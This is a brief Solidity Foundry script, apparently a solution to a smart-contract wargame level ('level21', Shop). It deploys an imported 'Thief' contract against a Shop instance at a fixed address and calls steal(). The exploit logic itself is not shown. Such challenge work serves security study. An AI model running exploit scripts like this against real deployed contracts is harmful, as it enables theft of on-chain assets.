// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Shop} from "../instances/Ilevel21.sol";
import {Thief} from "../src/level21.sol";

contract Attacker is Script {
    Shop level21 = Shop(0x8985Edec501b17f9F50aDf8F21558Ca096a35730);

    function run() external {
        vm.startBroadcast();

        Thief thief = new Thief(level21);
        thief.steal();

        vm.stopBroadcast();
    }
}
